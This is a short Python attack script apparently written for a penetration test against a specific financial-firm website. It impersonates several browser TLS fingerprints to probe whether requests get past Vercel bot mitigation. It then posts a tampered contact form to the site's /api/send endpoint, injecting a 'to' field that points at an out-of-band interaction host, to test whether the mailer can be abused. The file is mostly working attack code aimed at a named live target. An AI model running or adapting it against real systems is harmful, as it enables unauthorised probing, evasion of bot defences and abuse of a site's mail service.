import sys,time
from curl_cffi import requests as cr
B="https://www.infinitycapital.bh"
OOB="relay7f3a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
IMP=["chrome124","chrome120","chrome","safari17_0"]
def sess(imp="chrome124"):
    return cr.Session(impersonate=imp)
def go(p,m="GET",d=None,h=None,imp="chrome124"):
    s=sess(imp)
    try:
        r=s.request(m,B+p,data=d,headers=h,timeout=35,allow_redirects=False)
        return r
    except Exception as e:
        return e
if __name__=="__main__":
    t=sys.argv[1]
    if t=="probe":
        for imp in IMP:
            s=sess(imp)
            r=s.get(B+"/",timeout=30,allow_redirects=False)
            print(imp,r.status_code,len(r.content),r.headers.get("x-vercel-mitigated"))
            time.sleep(2)
    if t=="send":
        d={"fname":"vapt","lname":"probe","areacode":"+973","tel":"3600000","cname":"vapt","subject":"s","msg":"m","check":"1","targets":"0","to":"probe@"+OOB}
        r=go("/api/send","POST",d,{"Referer":B+"/contact"})
        print("send:",r.status_code,r.content[:400])
